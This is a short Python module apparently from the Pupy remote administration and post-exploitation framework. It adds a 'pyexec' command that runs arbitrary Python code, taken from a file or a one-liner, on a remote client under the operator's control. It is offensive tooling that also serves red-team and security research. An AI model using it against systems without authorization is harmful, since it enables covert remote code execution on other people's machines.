# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib import *

__class_name__="PythonExec"

@config(cat="admin")
class PythonExec(PupyModule):
    """ execute python code on a remote system """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='pyexec', description=self.__doc__)
        self.arg_parser.add_argument('--file', metavar="<path>", completer=path_completer, help="execute code from .py file")
        self.arg_parser.add_argument('-c','--code', metavar='<code string>', help="execute python oneliner code. ex : 'import platform;print platform.uname()'")

    def run(self, args):
        code=""
        if args.file:
            self.info("loading code from %s ..."%args.file)
            with open(args.file,'r') as f:
                code=f.read()
        elif args.code:
            code=args.code
        else:
            raise PupyModuleError("--code or --file argument is mandatory")

        with redirected_stdo(self):
            self.client.conn.execute(code+"\n")
